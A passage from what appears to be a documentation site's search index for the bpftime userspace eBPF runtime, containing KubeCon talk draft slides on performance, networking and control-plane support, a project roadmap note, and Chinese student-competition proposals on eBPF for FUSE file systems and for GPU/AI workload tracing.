</ul> <p>One of our most innovative features in bpftime is what we call \"concealed extension entries.\" This addresses a common problem with extension frameworks: performance overhead at extension points, even when no extensions are active.</p> <p>Think of it like toll booths on a highway. Traditional extension systems are like having toll booths at every possible exit, even if nobody ever takes that exit. Every car still has to slow down to check if they need to pay. This slows down traffic unnecessarily.</p> <p>Traditionally, applications with extension support have static hooks in their code. These hooks check if an extension is present and, if so, call into it. But these checks happen every time the code runs, even if no extensions are loaded, causing unnecessary overhead.</p> <p>bpftime takes a different approach. We use binary rewriting to dynamically inject hooks into applications only when extensions are actually loaded. When no extensions are active at a particular point, there's zero overhead - the application runs at full speed as if it had no extension support at all. It's like only building toll booths at exits people actually use, and leaving the highway clear everywhere else.</p> <p>This is actually the opposite of how binary rewriting is typically used. Most systems use it to add new extension points to applications that weren't designed for extensions. We use it to hide extension points that are already there, activating them only when needed.</p> <p>For example, imagine a web server with 50 potential extension points. In a traditional system, all 50 checks happen on every request, even if only 2 extensions are active. With bpftime, only the 2 points with active extensions have hooks, eliminating overhead at the other 48 points.</p> <p>This approach dramatically improves performance for applications with many potential extension points that are only occasionally used.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-18-bpftime-for-observability","title":"Slide 18: bpftime for Observability","text":"<p>[VISUAL: Performance comparison chart showing kernel vs userspace tracing latency]</p> <ul> <li>Userspace tracing advantages:</li> <li>10x faster: Uprobes (100ns vs 1000ns in kernel)</li> <li>10x faster: Memory access (4ns vs 40ns in kernel)</li> <li>Reduced overhead on untraced processes</li> <li>Compatible with existing tools:</li> <li>Run BCC and bpftrace in userspace</li> <li>Combine kprobes and uprobes for hybrid approaches</li> <li>Shift workload to improve overall performance</li> </ul> <p>So why do we want to do observability with eBPF in userspace?</p> <p>It's simple: userspace tracing is faster and more flexible. For example, Uprobes in the kernel take about 1000 nanoseconds, but in userspace, we've brought that down to just 100 nanoseconds. Similarly, memory access in userspace is about 10 times faster\u20144 nanoseconds versus 40 nanoseconds in the kernel. This speed difference happens because the kernel often has to translate memory addresses or run additional checks to access userspace memory.</p> <p>On top of that, there's less overhead on untraced processes, especially when dealing with syscall tracepoints.</p> <p>What can we run in userspace?</p> <p>With userspace tracing, tools like bcc and bpftrace can run completely in userspace where kernel eBPF is not available. And you can run more complex observability agents that combine kprobes and uprobes, improving performance by shifting part of the workload to userspace.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-19-bpftime-for-userspace-networking","title":"Slide 19: bpftime for Userspace Networking","text":"<p>[VISUAL: Diagram showing bpftime integration with kernel-bypass technologies like DPDK and AF_XDP]</p> <ul> <li>Advantages over kernel networking:</li> <li>Combines kernel-bypass performance with eBPF ecosystem</li> <li>Works with DPDK and AF_XDP</li> <li>Leverages LLVM optimizations for userspace</li> <li>Use cases:</li> <li>High-speed packet processing</li> <li>Network function virtualization</li> <li>Advanced load balancing</li> </ul> <p>Now, let's talk about bpftime in the networking context. Why use userspace eBPF instead of running eBPF in the kernel?</p> <p>We've seen kernel-bypass solutions like DPDK (Data Plane Development Kit) and AF_XDP (Address Family XDP). They can offer faster packet processing by bypassing the kernel. But with bpftime, you can combine the performance benefits of these kernel-bypass technologies with the extensive eBPF ecosystem. So, you get the best of both low-latency packet processing and the ability to use eBPF's safety and existing tools.</p> <p>We can also use LLVM optimizations to further boost performance in userspace.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-20-bpftime-with-userspace-network-integration","title":"Slide 20: bpftime with Userspace Network Integration","text":"<p>[VISUAL: Architecture diagram showing XDP program flow in userspace with bpftime]</p> <ul> <li>Seamless integration with eBPF XDP ecosystem</li> <li>Compatible with high-performance applications:</li> <li>Katran load balancer integration</li> <li>Works with both AF_XDP and DPDK</li> <li>Current work in progress:</li> <li>XDP_TX and XDP_DROP limitations</li> <li>Solutions for XDP_PASS packet reinjection</li> </ul> <p>Using bpftime, you can seamlessly integrate the eBPF XDP ecosystem into kernel-bypass applications. </p> <p>For instance, solutions like Katran, a high-performance load balancer from Facebook, can benefit from the optimizations we've made in bpftime for userspace. </p> <p>bpftime can work with both AF_XDP and DPDK. You can run your XDP eBPF programs as if they were in the kernel, just load them with bpftime, and they'll work like normal, while a DPDK app handles the network processing.</p> <p>Right now, there are some limitations with XDP_TX (packet transmission) and XDP_DROP (packet dropping) in userspace, but we're actively working on solutions. We're exploring ways to reinject packets into the kernel to support XDP_PASS (passing packets to the network stack).</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-21-control-plane-support","title":"Slide 21: Control Plane Support","text":"<p>[VISUAL: Diagram showing bpftime control plane architecture with syscall hooking and userspace runtime]</p> <ul> <li>Maintains compatibility with eBPF ecosystem:</li> <li>Loading/unloading programs</li> <li>Configuring maps</li> <li>Monitoring and debugging interfaces</li> <li>Implementation methods:</li> <li>LD_PRELOAD for syscall hooking</li> <li>Kernel eBPF integration</li> <li>Seamless connection to userspace runtime</li> </ul> <p>\"One of the core features that allows bpftime to remain compatible with the existing eBPF ecosystem is its control plane support for userspace eBPF.</p> <p>Control planes in eBPF are usually responsible for tasks like loading and unloading programs,  configuring maps, and providing monitoring and debugging interfaces. bpftime can fully supports this in userspace by hooking syscalls using LD_PRELOAD or kernel eBPF, and connect to the userspace runtime.</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-22-performance-benchmarks","title":"Slide 22: Performance Benchmarks","text":"<p>[VISUAL: Bar charts comparing performance metrics between kernel eBPF and bpftime]</p> <ul> <li>Network performance improvements:</li> <li>Up to 3x faster in simple XDP network functions</li> <li>Up to 40% faster in real-world applications like Katran</li> <li>Tracing performance:</li> <li>10x faster memory access</li> <li>10x faster uprobes</li> <li>Demonstrates userspace eBPF can outperform kernel-based solutions while maintaining compatibility</li> </ul> <p>\"Now, let's see the performance benchmarks. </p> <p>We've benchmarked a variety of eBPF programs running with bpftime. bpftime has achieved up to 3x faster performance in simple XDP network functions. In real-world applications like Katran, bpftime can acheive up to  40% faster.</p> <p>This shows that userspace eBPF can be fasyer kernel-based solutions, while retaining the flexibility that makes eBPF powerful.\"</p>"},{"location":"others/miscellaneous/bpftime-kubecon-draft/#slide-23-conclusion","title":"Slide 23: Conclusion","text":"<p>[VISUAL: Summary diagram showing bpftime bridging eBPF and Wasm approaches with key benefits highlighted]</p> <ul> <li>bpftime: A new approach to userspace extensions</li> <li>Combines strengths from both worlds:</li> <li>eBPF's verification and performance</li> <li>Wasm-like interface flexibility</li> <li>Enables:</li> <li>High-performance extensions</li> <li>Fine-grained safety controls</li> <li>Compatibility with existing tools</li> <li>Available today for experimentation and production use</li> </ul> <p>\"In conclusion, bpftime is a new approach to userspace eBPF that combines the safety and performance of kernel-level eBPF with the flexibility of userspace extensions. It's a path forward for developers and administrators alike, enabling highly customized, performant, and secure applications.\"</p> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/bpftime-roadmap/","title":"About bpftime - bpftime ideas","text":"<p>Some basic information about the bpftime project:</p>"},{"location":"others/miscellaneous/bpftime-roadmap/#the-project-original-and-the-eunomia-bpf-community","title":"The project original and the eunomia-bpf community","text":"<ol> <li>The project original and the eunomia-bpf community</li> </ol> <p>I'm maintaining a small open source organization call eunomia-bpf. We have contributors from multiple companies and universities, including engineers from Alibaba, Tencent some students and teachers from multiple universities. We are trying to make eBPF easier to use, and exploring new tool chains, runtimes for eBPF. We are also exploring the possibilities to combining eBPF with other technologies like WebAssembly, GPT-4, etc. I'm the founder of this organization, and the main contributor of the bpftime project.</p> <p>We are just open source organization and not a company, so we don't have any commercial interests. The PLCT lab(https://plctlab.github.io/) from Institute of Software Chinese Academy of Sciences(http://english.is.cas.cn/) gives us a sponsorship for our research and development, and help us employ interns and students (about 1-3 people) to work on the community projects. They don't have any copyright requirements, and My friends and I can decide the roadmap and direction of these projects. We need to do open-reports in public, write blog posts and tutorials, produce better and useful open source software, make contributions to the upstream projects, to make the community well-known and enhancing reputations.</p> <p>I also received some donations from some companies and universities using the projects.</p> <p>For the bpftime project, Two of the interns from the PLCT lab start working on it from May this year. It was started as an open-source project. The original goal is to make a general purpose, user space eBPF runtime to enable 10x faster uprobe tracing, and also an unprivileged, configurable and portable full-feature eBPF runtime, which can run complex eBPF applications like bpftrace instead of just some raw eBPF byte codes (like the ubpf). We are also actively exploring more possible use cases for the bpftime. One of my friends from USCS joined in September, currently we are also trying to make the project into a paper with her supervisor Andrew R. Quinn(https://arquinn.github.io/), for the tracing enhancement in uprobe and unprivileged eBPF.</p> <p>I'm very interested in the possible opportunity to seek more use cases and research topics for the bpftime project, especially in the networking area. Just like the DPDK eBPF1, I think bpftime can also make some changes to user space networking libraries, have a better performance and more flexible features.</p> <p>I have written a blog post about comparing other user space eBPF runtime and bpftime, and some use cases for user space eBPF. You can find it here: https://eunomia.dev/blogs/userspace-ebpf/</p> <p>Some basic performance Benchmarking comparing with other user space eBPF runtime and Wasm runtime: https://github.com/eunomia-bpf/bpf-benchmark</p>"},{"location":"others/miscellaneous/bpftime-roadmap/#the-possible-optimization-for-llvm-jit-compiler","title":"The possible optimization for LLVM JIT compiler","text":"<p>This is part of our roadmap, we will definitely do more optimization for the bpftime runtime in the future. Even with default optimization from LLVM, bpftime is already one of the fastest userspace eBPF runtime comparing to ubpf and rbpf. We haven't compare it with kernel eBPF, but I think maybe the userspace eBPF LLVM jit could benefit from:</p> <ul> <li>kernel BPF JIT has no support for Vector Extensions like AVX, but LLVM has.</li> <li>For each architecture, kernel eBPF needs to implement its own JIT. This will limit the optimization for each architecture, while LLVM has a more general and powerful JIT backend, enalbing more optimization on LLVM IR.</li> <li>It's hard to apply more and new optimization for kernel eBPF jit, it's less configurable, any code change will need a kernel version update in production. But for LLVM in user space, we can easily apply new optimization and features by adding new passes or do more specific optimization by change the compiler flags.</li> </ul> <p>For current process, we are focusing on providing more features for the bpftime runtime, make it compatible with kernel eBPF in maps, toolchains, attach methods, verification, and helpers. The kernel features we supported has enabled us to run applications like bpftrace, bcc tools, observability agents and ebpf-exporters directly in userspace without modification. However, there is still some work to do (about a few weeks) to make it transparent to the user space applications, and run more complex eBPF applications.</p> <p>The optimization for the LLVM backend is also a must for us, maybe we can be faster than kernel eBPF in some cases. Also, perhaps we can do AOT compilation for the eBPF byte code, and make it more portable and faster, without the requirement of LLVM runtime in deployment. With AOT compilation, we can produce a nearly native speed binary, with no runtime overhead but ensure safety, and can be easily deployed in embedded devices. The user space eBPF is Turing complete and can support directly function call, so it's possible to implement complex logic in eBPF. I think the AOT compilation feature can be added easily in one or two weeks.</p> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/ebpf-fuse/","title":"\u57fa\u4e8e\u5185\u6838\u6001/\u7528\u6237\u6001 eBPF \u5b9e\u73b0\u9ad8\u6027\u80fd\u7528\u6237\u6001\u6587\u4ef6\u7cfb\u7edf\u529f\u80fd - \u64cd\u4f5c\u7cfb\u7edf\u5927\u8d5b\u8d5b\u9898","text":""},{"location":"others/miscellaneous/ebpf-fuse/#_1","title":"\u9879\u76ee\u63cf\u8ff0","text":"<p>Fuse \u662f\u4e00\u4e2a\u7528\u6237\u6001\u6587\u4ef6\u7cfb\u7edf\u6846\u67b6\uff0c\u5b83\u5141\u8bb8\u5f00\u53d1\u4eba\u5458\u5728\u7528\u6237\u6001\u5b9e\u73b0\u6587\u4ef6\u7cfb\u7edf\u3002\u7136\u800c\uff0cFuse \u7684\u6027\u80fd\u4e00\u76f4\u662f\u4e00\u4e2a\u95ee\u9898\uff0c\u7279\u522b\u662f\u5728\u5927\u91cf\u6587\u4ef6\u64cd\u4f5c\u3001\u5927\u91cf\u8bbf\u95ee\u5143\u6570\u636e\u7b49\u7684\u60c5\u51b5\u4e0b\u3002eBPF\u662fLinux\u5185\u6838\u7684\u65b0\u7279\u6027\uff0c\u65b9\u4fbf\u7528\u6237\u5728\u5185\u6838\u91cc\u5b89\u5168\u8fd0\u884c\u81ea\u5b9a\u4e49\u7684\u903b\u8f91\uff0ceBPF\u5728\u7f51\u7edc\u3001\u5b89\u5168\u3001\u53ef\u89c2\u6d4b\u6027\u65b9\u9762\u5df2\u7ecf\u6709\u4e86\u5f88\u591a\u5e94\u7528\uff0c\u4e5f\u6709\u4e86\u4e00\u4e9b\u5c06 eBPF \u4e0e\u6587\u4ef6\u7cfb\u7edf\u6216 Fuse \u76f8\u7ed3\u5408\u7684\u5c1d\u8bd5\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>Extfuse \u8bba\u6587\u548c GitHub \u4ed3\u5e93\uff1ahttps://github.com/extfuse/extfuse</li> <li>Fuse-BPF: https://lwn.net/Articles/915717/</li> <li>XRP: https://www.usenix.org/conference/osdi22/presentation/zhong</li> </ul> <p>\u53ef\u4ee5\u8fdb\u4e00\u6b65\u63a2\u7d22\u5982\u4f55\u4f7f\u7528\u5185\u6838 eBPF \u7684\u673a\u5236\uff0c\u8fdb\u4e00\u6b65\u63d0\u9ad8 Fuse \u7684\u6027\u80fd\uff0c\u6216\u8005\u4e5f\u53ef\u4ee5\u8fdb\u4e00\u6b65\u63a2\u7d22\u5982\u4f55\u4f7f\u7528\u7528\u6237\u6001 eBPF \u7684\u673a\u5236\u6765\u8fdb\u884c\u534f\u540c\u4f18\u5316\uff1a</p> <p>bpftime \u662f\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u7684 eBPF \u8fd0\u884c\u65f6\uff0c\u53ef\u8ba9\u73b0\u6709\u7684 eBPF \u5e94\u7528\u7a0b\u5e8f\u76f4\u63a5\u5728\u975e\u7279\u6743\u7528\u6237\u7a7a\u95f4\u4e2d\u8fd0\u884c\uff0c\u4f7f\u7528\u76f8\u540c\u7684\u5e93\u548c\u5de5\u5177\u94fe\uff0c\u5e76\u4e14\u83b7\u53d6\u5230\u8ffd\u8e2a\u5206\u6790\u7684\u7ed3\u679c\u3002\u5b83\u4e3a eBPF \u63d0\u4f9b Uprobe \u548c Syscall tracepoint \u7b49\u8ffd\u8e2a\u70b9\uff0c\u5e76\u4e14\u5141\u8bb8\u5728\u7528\u6237\u6001\u76f4\u63a5\u4fee\u6539\u5e93\u51fd\u6570\u6216\u8005\u7cfb\u7edf\u8c03\u7528\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u7684\u4ee3\u7801\u63d2\u6869\u6216\u8fdb\u7a0b\u91cd\u542f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u4e8e\u6e90\u4ee3\u7801\u548c\u7f16\u8bd1\u6d41\u7a0b\u7684\u65e0\u4fb5\u5165\u5f0f\u5206\u6790\u548c\u6269\u5c55\u3002</p> <p>bpftime \u53ef\u80fd\u6709\u52a9\u4e8e\uff1a</p> <ul> <li>\u51cf\u5c11\u7cfb\u7edf\u8c03\u7528\u7684\u5f00\u9500\u5e76\u63d0\u9ad8\u6027\u80fd</li> <li>\u4e3a fuse \u542f\u7528\u7f13\u5b58\u800c\u65e0\u9700\u4f9d\u8d56\u65b0\u7248\u672c\u5185\u6838\u6216\u4fee\u6539\u5185\u6838\u4ee3\u7801</li> <li>\u6839\u636e\u6027\u80fd profile \u7684\u6570\u636e\uff0c\u52a8\u6001\u8c03\u6574\u6587\u4ef6\u7cfb\u7edf\u7b56\u7565</li> <li>\u4e3a fuse \u6dfb\u52a0\u66f4\u591a\u590d\u6742\u7b56\u7565\u548c\u7b56\u7565</li> </ul>"},{"location":"others/miscellaneous/ebpf-fuse/#_2","title":"\u9884\u671f\u76ee\u6807","text":"<p>\u5206\u6790\u73b0\u6709\u7684 Fuse \u548c eBPF \u6587\u4ef6\u7cfb\u7edf\u7684\u6027\u80fd\u74f6\u9888\uff0c\u7ed3\u5408 eBPF \u8bbe\u8ba1\u5e76\u5b9e\u73b0\u4e00\u4e2a\u9ad8\u6027\u80fd\u7684\u7528\u6237\u6001\u6587\u4ef6\u7cfb\u7edf\u529f\u80fd</p>"},{"location":"others/miscellaneous/ebpf-fuse/#_3","title":"\u7279\u5f81","text":"<p>\u9879\u76ee\u7684\u7279\u5f81\u53ef\u80fd\u53ef\u4ee5\u5305\u62ec\uff1a</p> <ol> <li>\u7528\u6237\u7a7a\u95f4\u548c\u5185\u6838\u7a7a\u95f4\u4e4b\u95f4\u7684\u534f\u540c\u4f18\u5316\uff1a\u5229\u7528 <code>bpftime</code> \u9884\u5904\u7406\u7528\u6237\u7a7a\u95f4\u4e2d\u7684\u6587\u4ef6\u7cfb\u7edf\u64cd\u4f5c\uff0c\u5982\u7f13\u5b58\u548c\u5143\u6570\u636e\u67e5\u8be2\uff0c\u4ece\u800c\u6700\u5c0f\u5316\u7cfb\u7edf\u8c03\u7528\u5f00\u9500\u3002</li> <li>\u7528\u6237\u7a7a\u95f4\u4e2d\u7684\u5185\u6838\u7ed5\u8fc7\u673a\u5236\uff1a\u4f7f\u7528 eBPF \u4e3a\u7528\u6237\u7a7a\u95f4\u4e2d\u7684\u6587\u4ef6\u7cfb\u7edf\u5f00\u53d1\u4e00\u4e2a\u5185\u6838 bypass \u673a\u5236\uff0c\u6d88\u9664\u5bf9\u7528\u6237\u5e94\u7528\u7a0b\u5e8f\u8fdb\u884c\u4fb5\u5165\u5f0f\u66f4\u6539\u7684\u9700\u8981\u3002</li> <li>\u52a8\u6001\u7b56\u7565\u8c03\u6574\uff1a\u5b9e\u73b0\u4e00\u4e2a\u7cfb\u7edf\uff0c\u52a8\u6001\u6536\u96c6\u6027\u80fd\u6570\u636e\u5e76\u5b9e\u65f6\u8c03\u6574 Fuse eBPF \u7b56\u7565\u3002</li> <li>\u9488\u5bf9\u7279\u5b9a\u5de5\u4f5c\u8d1f\u8f7d\u7684\u5b9a\u5236\uff1a\u4f7f\u5f00\u53d1\u8005\u80fd\u591f\u4e3a\u591a\u79cd\u5e94\u7528\u573a\u666f\u5b9a\u5236 eBPF \u7a0b\u5e8f\uff0c\u9488\u5bf9\u4e0d\u540c\u7684\u5de5\u4f5c\u8d1f\u8f7d\u8fdb\u884c\u4f18\u5316\u3002</li> </ol> <p>\uff08\u4ee5\u4e0a\u5e76\u975e\u5f3a\u5236\uff09</p>"},{"location":"others/miscellaneous/ebpf-fuse/#_4","title":"\u5df2\u6709\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Extfuse \u8bba\u6587\u548c GitHub \u4ed3\u5e93\uff1ahttps://github.com/extfuse/extfuse</li> <li>Fuse-BPF: https://lwn.net/Articles/915717/</li> <li>XRP: https://www.usenix.org/conference/osdi22/presentation/zhong</li> <li>bpftime</li> </ul>"},{"location":"others/miscellaneous/ebpf-fuse/#_5","title":"\u8d5b\u9898\u5206\u7c7b","text":"<p>\u3010code:303\u30112.3.3 \u6587\u4ef6\u7cfb\u7edf</p>"},{"location":"others/miscellaneous/ebpf-fuse/#_6","title":"\u53c2\u8d5b\u8981\u6c42","text":"<ul> <li>\u4ee5\u5c0f\u7ec4\u4e3a\u5355\u4f4d\u53c2\u8d5b\uff0c\u6700\u591a\u4e09\u4eba\u4e00\u4e2a\u5c0f\u7ec4\uff0c\u4e14\u5c0f\u7ec4\u6210\u5458\u662f\u6765\u81ea\u540c\u4e00\u6240\u9ad8\u6821\u7684\u672c\u79d1\u751f\u6216\u7814\u7a76\u751f</li> <li>\u5141\u8bb8\u5b66\u751f\u53c2\u52a0\u5927\u8d5b\u7684\u591a\u4e2a\u4e0d\u540c\u9898\u76ee\uff0c\u6700\u7ec8\u81ea\u5df1\u9009\u62e9\u4e00\u4e2a\u9898\u76ee\u53c2\u4e0e\u8bc4\u5956</li> <li>\u8bf7\u9075\u5faa\u201c2024\u5168\u56fd\u5927\u5b66\u751f\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u8d5b\u201d\u7684\u7ae0\u7a0b\u548c\u6280\u672f\u65b9\u6848\u8981\u6c42</li> </ul>"},{"location":"others/miscellaneous/ebpf-fuse/#_7","title":"\u96be\u5ea6","text":"<p>\u9ad8\u7b49</p>"},{"location":"others/miscellaneous/ebpf-fuse/#license","title":"License","text":"<p>GPL-3.0 License</p>"},{"location":"others/miscellaneous/ebpf-fuse/#_8","title":"\u6240\u5c5e\u8d5b\u9053","text":"<p>2024\u5168\u56fd\u5927\u5b66\u751f\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u8d5b\u7684\u201cOS\u529f\u80fd\u6311\u6218\u201d\u8d5b\u9053</p>"},{"location":"others/miscellaneous/ebpf-fuse/#_9","title":"\u9879\u76ee\u5bfc\u5e08","text":"<ul> <li>\u59d3\u540d\uff1a\u90d1\u6631\u7b19</li> <li>\u5355\u4f4d\uff1aeunomia-bpf \u5f00\u6e90\u793e\u533a</li> <li>github ID\uff1ahttps://github.com/yunwei37</li> <li>email\uff1ateam@eunomia.dev and yunwei356@gmail.com</li> </ul> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/ebpf-gpu/","title":"\u4f7f\u7528 eBPF \u5bf9 AI/ML \u5de5\u4f5c\u8d1f\u8f7d\u8fdb\u884c\u8ffd\u8e2a\u548c\u6027\u80fd\u5206\u6790 - \u64cd\u4f5c\u7cfb\u7edf\u5927\u8d5b\u8d5b\u9898","text":""},{"location":"others/miscellaneous/ebpf-gpu/#_1","title":"\u9879\u76ee\u63cf\u8ff0","text":"<p>\u968f\u7740\u4eba\u5de5\u667a\u80fd\uff08AI\uff09\u6280\u672f\u7684\u5feb\u901f\u53d1\u5c55\uff0c\u4ee5\u53ca LLM \u6a21\u578b\u53d8\u5f97\u65e5\u76ca\u590d\u6742\uff0c\u5bf9\u8ba1\u7b97\u8d44\u6e90\u7684\u9700\u6c42\u4e5f\u5728\u6301\u7eed\u589e\u957f\u3002\u5728\u8fd9\u79cd\u80cc\u666f\u4e0b\uff0c\u6709\u6548\u76d1\u63a7\u548c\u4f18\u5316AI \u5de5\u4f5c\u8d1f\u8f7d\u7684\u6027\u80fd\u6210\u4e3a\u4e86\u4e00\u4e2a\u91cd\u8981\u8bae\u9898\u3002\u5f53\u6a21\u578b\u8bad\u7ec3\u4e00\u4e2a\u8d85\u53c2\u6570\u7ec4\u5408\u53ef\u80fd\u9700\u8981\u6570\u5341\u4e07\u7f8e\u5143\u65f6\uff0c\u6295\u8d44\u4e8e\u52a0\u901f\u8fd9\u4e9b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u8282\u7701\u5927\u91cf\u6210\u672c\u3002\u6210\u672c\u6307\u6807\u53ef\u4ee5\u662f\u7f8e\u5143\u6570\u989d\u3001\u5146\u74e6\u8db3\u8ff9\u548c\u4e8c\u6c27\u5316\u78b3\u6392\u653e\u91cf\u3002\u63d0\u9ad8\u6548\u7387\u7684\u5173\u952e\u5728\u4e8e\u53ef\u89c2\u6d4b\u6027\u548c\u5206\u6790\uff0c\u800c\u5f88\u5927\u7a0b\u5ea6\u4e0a\u53ef\u89c2\u6d4b\u6027\u662f\u6280\u672f\u3001\u5de5\u5177\u3001\u6570\u636e\u96c6\u548c\u4eea\u8868\u76d8\u7684\u7efc\u5408\u4f53\uff0c\u5b83\u4f7f\u6211\u4eec\u80fd\u591f\u9996\u5148\u8bc4\u4f30\u57fa\u7840\u8bbe\u65bd\u5728\u4e0d\u540c\u7c92\u5ea6\u6c34\u5e73\u4e0a\u5b9e\u73b0\u7684\u6027\u80fd\u6c34\u5e73\uff0c\u7136\u540e\u6307\u5bfc\u6211\u4eec\u8fdb\u884c\u6295\u8d44\u3002</p> <p>\u672c\u9879\u76ee\u7684\u76ee\u7684\u662f\u5f00\u53d1\u4e00\u79cd\u57fa\u4e8eeBPF\uff08Extended Berkeley Packet Filter\uff09\u7684\u7cfb\u7edf\uff0c\u4e13\u95e8\u7528\u4e8eAI/ML\u5de5\u4f5c\u8d1f\u8f7d\u7684\u8ffd\u8e2a\u548c\u6027\u80fd\u5206\u6790\u3002eBPF\u662fLinux\u5185\u6838\u7684\u4e00\u9879\u6280\u672f\uff0c\u80fd\u591f\u5b89\u5168\u5730\u8fd0\u884c\u5185\u6838\u7ea7\u7684\u6c99\u7bb1\u7a0b\u5e8f\uff0c\u63d0\u4f9b\u4e86\u9ad8\u6548\u3001\u53ef\u7f16\u7a0b\u3001\u4f4e\u5f00\u9500\u7684\u6027\u80fd\u5206\u6790\u80fd\u529b\u3002</p> <p>\u9879\u76ee\u7684\u7075\u611f\u6765\u6e90\u4e8eMeta\uff08\u524d\u8eab\u4e3aFacebook\uff09\u7684AI\u89c2\u6d4b\u57fa\u7840\u8bbe\u65bd\uff0c\u4ee5\u53ca\u5728 eBPF submit 2023 \u4e2d\u7684\u6f14\u8bb2\u3002Meta \u5f00\u53d1\u4e86\u4e00\u5957\u591a\u5c42\u6b21\u7684\u7cfb\u7edf\uff0c\u5305\u62ec\u5e95\u5c42\u7684\u786c\u4ef6\u9065\u6d4b\u548c\u76d1\u63a7\u3001\u9ad8\u7ea7\u6027\u80fd\u5185\u7701\u5de5\u5177\u3001\u4ee5\u53ca\u5927\u89c4\u6a21\u6027\u80fd\u5206\u6790\u5e73\u53f0\u3002\u5176\u4e2d\uff0c\u4f7f\u7528 eBPF \u8fdb\u884c GPU \u6027\u80fd\u5206\u6790\u7684\u6982\u5ff5\u7279\u522b\u5f15\u4eba\u6ce8\u76ee\uff0c\u56e0\u4e3a\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u6709\u6548\u7684\u65b9\u6cd5\u6765\u76d1\u63a7\u548c\u4f18\u5316 AI \u5de5\u4f5c\u8d1f\u8f7d\uff0c\u7279\u522b\u662f\u5728 GPU \u52a0\u901f\u8ba1\u7b97\u9886\u57df\u3002\u548c\u4f20\u7edf\u64cd\u4f5c\u7cfb\u7edf\u7684\u6027\u80fd\u5206\u6790\u76f8\u6bd4\uff0cGPU \u7684\u5206\u6790\u6d89\u53ca\u5230\u66f4\u591a\u7684\u786c\u4ef6\u548c\u8f6f\u4ef6\u5c42\u6b21\uff0c\u4ece\u7528\u6237\u6001\u7684\u8fd0\u884c\u65f6\u5e93\u5206\u6790\u5230\u786c\u4ef6\u7684\u8ffd\u8e2a\u5355\u5143\uff0c\u56e0\u6b64\u9700\u8981\u66f4\u591a\u7684\u5de5\u5177\u548c\u6280\u672f\u3002</p> <p>\u672c\u9879\u76ee\u5c06\u7ed3\u5408\u8fd9\u4e9b\u5148\u8fdb\u7684\u65b9\u6cd5\u548c\u6280\u672f\uff0c\u5f00\u53d1\u4e00\u4e2a\u7cfb\u7edf\uff0c\u7528\u4e8e\u5b9e\u65f6\u8ffd\u8e2a\u548c\u5206\u6790AI/ML\u5de5\u4f5c\u8d1f\u8f7d\u7684\u6027\u80fd\u3002\u8be5\u7cfb\u7edf\u5c06\u5177\u5907\u4ee5\u4e0b\u7279\u70b9\uff1a</p> <ol> <li>\u9ad8\u6548\u7684GPU\u6027\u80fd\u5206\u6790\uff1a\u5229\u7528eBPF\u8fdb\u884cGPU\u4e8b\u4ef6\uff08\u5982CUDA\u5185\u6838\u542f\u52a8\u3001\u540c\u6b65\u4e8b\u4ef6\u548c\u5185\u5b58\u4e8b\u4ef6\uff09\u7684\u8ffd\u8e2a\u548c\u5206\u6790\u3002</li> <li>\u5168\u9762\u7684\u6027\u80fd\u76d1\u63a7\uff1a\u7ed3\u5408CPU\u548cGPU\u7684\u6027\u80fd\u6570\u636e\uff0c\u63d0\u4f9b\u4e00\u4e2a\u5168\u9762\u7684\u6027\u80fd\u89c6\u56fe\u3002</li> <li>\u4f4e\u5f00\u9500\u7684\u6570\u636e\u6536\u96c6\uff1a\u4f7f\u7528eBPF\u6280\u672f\u786e\u4fdd\u6027\u80fd\u6570\u636e\u6536\u96c6\u7684\u5f00\u9500\u6700\u5c0f\u5316\uff0c\u540c\u65f6\u4e0d\u5f71\u54cd\u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\u3002</li> <li>\u81ea\u52a8\u5316\u8ffd\u8e2a\u548c\u5206\u6790\uff1a\u81ea\u52a8\u5316\u6536\u96c6\u591a\u4e2a\u4e3b\u673a\u548c\u5206\u6790\u5668\u7684\u6570\u636e\uff0c\u63d0\u4f9b\u4e00\u4e2a\u6574\u5408\u7684\u6027\u80fd\u5206\u6790\u89c6\u56fe\u3002</li> <li>\u6613\u4e8e\u96c6\u6210\u548c\u4f7f\u7528\uff1a\u8bbe\u8ba1\u6613\u4e8e\u96c6\u6210\u5230\u73b0\u6709AI/ML\u5f00\u53d1\u73af\u5883\u4e2d\u7684\u5de5\u5177\uff0c\u4e14\u7528\u6237\u53cb\u597d\u3002</li> </ol> <p>\u6b64\u5916\uff0c\u9879\u76ee\u53ef\u4ee5\u53c2\u8003 Dynolog \u7cfb\u7edf\u3001GPU\u6027\u80fd\u6307\u6807\uff08\u5982FLOPs/\u79d2\uff09\u3001\u4ee5\u53ca\u4f7f\u7528 DCGM \u548c CUPTI \u7b49\u5de5\u5177\u8fdb\u884c FLOPs \u4f30\u7b97\u7684\u65b9\u6cd5\u3002\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a\u80fd\u591f\u4e3aAI/ML\u7814\u7a76\u548c\u5f00\u53d1\u793e\u533a\u63d0\u4f9b\u5f3a\u5927\u652f\u6301\u7684\u5f00\u6e90\u5de5\u5177\u3002</p>"},{"location":"others/miscellaneous/ebpf-gpu/#_2","title":"\u9884\u671f\u76ee\u6807","text":"<ul> <li>\u5b8c\u6210\u4e00\u4e2a\u4e3b\u8981\u57fa\u4e8e eBPF \u7684 AI/ML \u5de5\u4f5c\u8d1f\u8f7d\u8ffd\u8e2a\u548c\u6027\u80fd\u5206\u6790\u5de5\u5177\u3002</li> <li>\u8be5\u5de5\u5177\u80fd\u591f\u63d0\u4f9b\u6df1\u5165\u7684\u6027\u80fd\u5206\u6790\uff0c\u5e2e\u52a9 AI 